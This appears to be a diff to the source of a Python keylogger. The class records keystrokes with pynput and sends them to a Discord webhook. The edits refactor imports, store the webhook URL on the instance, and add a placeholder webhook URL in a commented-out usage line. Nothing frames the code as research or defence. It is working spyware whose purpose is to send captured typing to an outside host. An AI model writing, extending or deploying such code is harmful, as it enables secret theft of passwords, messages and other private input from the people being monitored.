@@ -1,20 +1,22 @@
 from pynput import keyboard
-import requests
 from discord import SyncWebhook, File
 import discord
 import threading
 import socket
-from config import WEBHOOK_KEYLOGGER, INTERVAL
+import os
+import requests
+from config import INTERVAL, WEBHOOK_KEYLOGGER
 
 
 class Keylogger:
     def __init__(self):
         self.keys = ""
+        self.webhook_url = WEBHOOK_KEYLOGGER
         
     def send(self):
         try:
             try:
-                webhook = SyncWebhook.from_url(WEBHOOK_KEYLOGGER)
+                webhook = SyncWebhook.from_url(self.webhook_url)
             except:
                 return
 
@@ -108,5 +110,5 @@ class Keylogger:
         except:
             pass
 
-#Logger = Keylogger()
+#Logger = Keylogger("https://discord.com/api/webhooks/ID/TOKEN")
 #Logger.run()
